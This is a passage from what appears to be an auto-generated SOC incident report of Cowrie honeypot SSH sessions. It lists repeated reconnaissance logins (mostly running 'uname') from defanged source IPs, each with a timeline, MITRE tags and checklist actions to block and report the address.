- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc36ff34886c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:32` | `cowrie.session.connect` |
| `2026-07-04 14:57:32` | `cowrie.client.version` |
| `2026-07-04 14:57:33` | `cowrie.client.kex` |
| `2026-07-04 14:57:33` | `cowrie.login.success` |
| `2026-07-04 14:57:34` | `cowrie.session.params` |
| `2026-07-04 14:57:34` | `cowrie.command.input` |
| `2026-07-04 14:57:34` | `cowrie.log.closed` |
| `2026-07-04 14:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e96e331cd05

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:36` | `cowrie.session.connect` |
| `2026-07-04 14:57:36` | `cowrie.client.version` |
| `2026-07-04 14:57:36` | `cowrie.client.kex` |
| `2026-07-04 14:57:36` | `cowrie.login.success` |
| `2026-07-04 14:57:37` | `cowrie.session.params` |
| `2026-07-04 14:57:37` | `cowrie.command.input` |
| `2026-07-04 14:57:37` | `cowrie.log.closed` |
| `2026-07-04 14:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-992132d19efd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:39` | `cowrie.session.connect` |
| `2026-07-04 14:57:39` | `cowrie.client.version` |
| `2026-07-04 14:57:39` | `cowrie.client.kex` |
| `2026-07-04 14:57:39` | `cowrie.login.success` |
| `2026-07-04 14:57:40` | `cowrie.session.params` |
| `2026-07-04 14:57:40` | `cowrie.command.input` |
| `2026-07-04 14:57:40` | `cowrie.log.closed` |
| `2026-07-04 14:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f309a8f7fb26

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:40` | `cowrie.session.connect` |
| `2026-07-04 14:57:41` | `cowrie.client.version` |
| `2026-07-04 14:57:41` | `cowrie.client.kex` |
| `2026-07-04 14:57:50` | `cowrie.login.success` |
| `2026-07-04 14:57:54` | `cowrie.session.params` |
| `2026-07-04 14:57:54` | `cowrie.command.input` |
| `2026-07-04 14:57:55` | `cowrie.log.closed` |
| `2026-07-04 14:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c25e5edc146f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:42` | `cowrie.session.connect` |
| `2026-07-04 14:57:42` | `cowrie.client.version` |
| `2026-07-04 14:57:42` | `cowrie.client.kex` |
| `2026-07-04 14:57:43` | `cowrie.login.success` |
| `2026-07-04 14:57:43` | `cowrie.session.params` |
| `2026-07-04 14:57:43` | `cowrie.command.input` |
| `2026-07-04 14:57:44` | `cowrie.log.closed` |
| `2026-07-04 14:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f3652b76be

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:45` | `cowrie.session.connect` |
| `2026-07-04 14:57:45` | `cowrie.client.version` |
| `2026-07-04 14:57:45` | `cowrie.client.kex` |
| `2026-07-04 14:57:46` | `cowrie.login.success` |
| `2026-07-04 14:57:46` | `cowrie.session.params` |
| `2026-07-04 14:57:46` | `cowrie.command.input` |
| `2026-07-04 14:57:47` | `cowrie.log.closed` |
| `2026-07-04 14:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2efd658f0ac1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:49` | `cowrie.session.connect` |
| `2026-07-04 14:57:49` | `cowrie.client.version` |
| `2026-07-04 14:57:49` | `cowrie.client.kex` |
| `2026-07-04 14:57:49` | `cowrie.login.success` |
| `2026-07-04 14:57:50` | `cowrie.session.params` |
| `2026-07-04 14:57:50` | `cowrie.command.input` |
| `2026-07-04 14:57:50` | `cowrie.log.closed` |
| `2026-07-04 14:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f02799f942

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:52` | `cowrie.session.connect` |
| `2026-07-04 14:57:52` | `cowrie.client.version` |
| `2026-07-04 14:57:52` | `cowrie.client.kex` |
| `2026-07-04 14:57:52` | `cowrie.login.success` |
| `2026-07-04 14:57:53` | `cowrie.session.params` |
| `2026-07-04 14:57:53` | `cowrie.command.input` |
| `2026-07-04 14:57:54` | `cowrie.log.closed` |
| `2026-07-04 14:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1810a2aee996

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:55` | `cowrie.session.connect` |
| `2026-07-04 14:57:55` | `cowrie.client.version` |
| `2026-07-04 14:57:55` | `cowrie.client.kex` |
| `2026-07-04 14:57:56` | `cowrie.login.success` |
| `2026-07-04 14:57:56` | `cowrie.session.params` |
| `2026-07-04 14:57:56` | `cowrie.command.input` |
| `2026-07-04 14:57:57` | `cowrie.log.closed` |
| `2026-07-04 14:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b426eeeb2968

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:59` | `cowrie.session.connect` |
| `2026-07-04 14:57:59` | `cowrie.client.version` |
| `2026-07-04 14:57:59` | `cowrie.client.kex` |
| `2026-07-04 14:57:59` | `cowrie.login.success` |
| `2026-07-04 14:58:00` | `cowrie.session.params` |
| `2026-07-04 14:58:00` | `cowrie.command.input` |
| `2026-07-04 14:58:00` | `cowrie.log.closed` |
| `2026-07-04 14:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2783734541e2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:02` | `cowrie.session.connect` |
| `2026-07-04 14:58:02` | `cowrie.client.version` |
| `2026-07-04 14:58:02` | `cowrie.client.kex` |
| `2026-07-04 14:58:02` | `cowrie.login.success` |
| `2026-07-04 14:58:03` | `cowrie.session.params` |
| `2026-07-04 14:58:03` | `cowrie.command.input` |
| `2026-07-04 14:58:03` | `cowrie.log.closed` |
| `2026-07-04 14:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37f8118b2c01

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:05` | `cowrie.session.connect` |
| `2026-07-04 14:58:05` | `cowrie.client.version` |
| `2026-07-04 14:58:05` | `cowrie.client.kex` |
| `2026-07-04 14:58:06` | `cowrie.login.success` |
| `2026-07-04 14:58:06` | `cowrie.session.params` |
| `2026-07-04 14:58:06` | `cowrie.command.input` |
| `2026-07-04 14:58:07` | `cowrie.log.closed` |
| `2026-07-04 14:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fc92563b2a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:08` | `cowrie.session.connect` |
| `2026-07-04 14:58:08` | `cowrie.client.version` |
| `2026-07-04 14:58:09` | `cowrie.client.kex` |
| `2026-07-04 14:58:09` | `cowrie.login.success` |
| `2026-07-04 14:58:10` | `cowrie.session.params` |
| `2026-07-04 14:58:10` | `cowrie.command.input` |
| `2026-07-04 14:58:10` | `cowrie.log.closed` |
| `2026-07-04 14:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c9a989dded4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:12` | `cowrie.session.connect` |
| `2026-07-04 14:58:12` | `cowrie.client.version` |
| `2026-07-04 14:58:12` | `cowrie.client.kex` |
| `2026-07-04 14:58:12` | `cowrie.login.success` |
| `2026-07-04 14:58:13` | `cowrie.session.params` |
| `2026-07-04 14:58:13` | `cowrie.command.input` |
| `2026-07-04 14:58:13` | `cowrie.log.closed` |
| `2026-07-04 14:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3f45c401af

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:15` | `cowrie.session.connect` |
| `2026-07-04 14:58:15` | `cowrie.client.version` |
| `2026-07-04 14:58:15` | `cowrie.client.kex` |
| `2026-07-04 14:58:16` | `cowrie.login.success` |
| `2026-07-04 14:58:16` | `cowrie.session.params` |
| `2026-07-04 14:58:16` | `cowrie.command.input` |
| `2026-07-04 14:58:16` | `cowrie.log.closed` |
| `2026-07-04 14:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f46b8faba470

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:18` | `cowrie.session.connect` |
| `2026-07-04 14:58:18` | `cowrie.client.version` |
| `2026-07-04 14:58:19` | `cowrie.client.kex` |
| `2026-07-04 14:58:19` | `cowrie.login.success` |
| `2026-07-04 14:58:19` | `cowrie.session.params` |
| `2026-07-04 14:58:19` | `cowrie.command.input` |
| `2026-07-04 14:58:20` | `cowrie.log.closed` |
| `2026-07-04 14:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3ad6f3f055

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:22` | `cowrie.session.connect` |
| `2026-07-04 14:58:22` | `cowrie.client.version` |
| `2026-07-04 14:58:22` | `cowrie.client.kex` |
| `2026-07-04 14:58:22` | `cowrie.login.success` |
| `2026-07-04 14:58:23` | `cowrie.session.params` |
| `2026-07-04 14:58:23` | `cowrie.command.input` |
| `2026-07-04 14:58:23` | `cowrie.log.closed` |
| `2026-07-04 14:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-532f93926737

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:25` | `cowrie.session.connect` |
| `2026-07-04 14:58:25` | `cowrie.client.version` |
| `2026-07-04 14:58:25` | `cowrie.client.kex` |
| `2026-07-04 14:58:25` | `cowrie.login.success` |
| `2026-07-04 14:58:26` | `cowrie.session.params` |
| `2026-07-04 14:58:26` | `cowrie.command.input` |
| `2026-07-04 14:58:26` | `cowrie.log.closed` |
| `2026-07-04 14:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79992678bff3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:28` | `cowrie.session.connect` |
| `2026-07-04 14:58:28` | `cowrie.client.version` |
| `2026-07-04 14:58:28` | `cowrie.client.kex` |
| `2026-07-04 14:58:29` | `cowrie.login.success` |
| `2026-07-04 14:58:29` | `cowrie.session.params` |
| `2026-07-04 14:58:29` | `cowrie.command.input` |
| `2026-07-04 14:58:30` | `cowrie.log.closed` |
| `2026-07-04 14:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e3690422e1c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:32` | `cowrie.session.connect` |
| `2026-07-04 14:58:32` | `cowrie.client.version` |
| `2026-07-04 14:58:32` | `cowrie.client.kex` |
| `2026-07-04 14:58:32` | `cowrie.login.success` |
| `2026-07-04 14:58:33` | `cowrie.session.params` |
| `2026-07-04 14:58:33` | `cowrie.command.input` |
| `2026-07-04 14:58:33` | `cowrie.log.closed` |
| `2026-07-04 14:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ade51423c1f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:35` | `cowrie.session.connect` |
| `2026-07-04 14:58:35` | `cowrie.client.version` |
| `2026-07-04 14:58:35` | `cowrie.client.kex` |
| `2026-07-04 14:58:36` | `cowrie.login.success` |
| `2026-07-04 14:58:36` | `cowrie.session.params` |
| `2026-07-04 14:58:36` | `cowrie.command.input` |
| `2026-07-04 14:58:36` | `cowrie.log.closed` |
| `2026-07-04 14:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0485b9944deb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:38` | `cowrie.session.connect` |
| `2026-07-04 14:58:38` | `cowrie.client.version` |
| `2026-07-04 14:58:38` | `cowrie.client.kex` |
| `2026-07-04 14:58:39` | `cowrie.login.success` |
| `2026-07-04 14:58:39` | `cowrie.session.params` |
| `2026-07-04 14:58:39` | `cowrie.command.input` |
| `2026-07-04 14:58:40` | `cowrie.log.closed` |
| `2026-07-04 14:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f13f35623e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:42` | `cowrie.session.connect` |
| `2026-07-04 14:58:42` | `cowrie.client.version` |
| `2026-07-04 14:58:42` | `cowrie.client.kex` |
| `2026-07-04 14:58:42` | `cowrie.login.success` |
| `2026-07-04 14:58:43` | `cowrie.session.params` |
| `2026-07-04 14:58:43` | `cowrie.command.input` |
| `2026-07-04 14:58:43` | `cowrie.log.closed` |
| `2026-07-04 14:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0fe96e8a060

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:45` | `cowrie.session.connect` |
| `2026-07-04 14:58:45` | `cowrie.client.version` |
| `2026-07-04 14:58:45` | `cowrie.client.kex` |
| `2026-07-04 14:58:45` | `cowrie.login.success` |
| `2026-07-04 14:58:46` | `cowrie.session.params` |
| `2026-07-04 14:58:46` | `cowrie.command.input` |
| `2026-07-04 14:58:46` | `cowrie.log.closed` |
| `2026-07-04 14:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c4781efef62

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:48` | `cowrie.session.connect` |
| `2026-07-04 14:58:48` | `cowrie.client.version` |
| `2026-07-04 14:58:48` | `cowrie.client.kex` |
| `2026-07-04 14:58:49` | `cowrie.login.success` |
| `2026-07-04 14:58:49` | `cowrie.session.params` |
| `2026-07-04 14:58:49` | `cowrie.command.input` |
| `2026-07-04 14:58:50` | `cowrie.log.closed` |
| `2026-07-04 14:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae7f64daf44

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:58 |
| **Last Seen** | 2026-07-04 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:58:52` | `cowrie.session.connect` |
| `2026-07-04 14:58:52` | `cowrie.client.version` |
| `2026-07-04 14:58:52` | `cowrie.client.kex` |
| `2026-07-04 14:58:52` | `cowrie.login.success` |
